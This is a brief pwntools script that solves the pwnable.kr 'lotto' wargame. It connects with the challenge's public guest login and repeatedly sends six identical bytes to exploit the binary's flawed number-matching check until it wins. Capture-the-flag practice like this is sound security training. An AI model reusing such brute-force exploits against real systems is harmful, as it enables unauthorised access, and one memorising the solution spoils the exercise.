from pwn import *

sh = ssh(host='pwnable.kr', port=2222, user='lotto', password='guest')
p = sh.process('./lotto')

while True:
    p.sendlineafter(b'3. Exit', b'1')
    p.sendlineafter(b'lotto bytes :', b'!!!!!!')
    p.recvline()
    line = p.recvline()
    print(line)
    if not b'bad luck' in line:
        p.interactive()
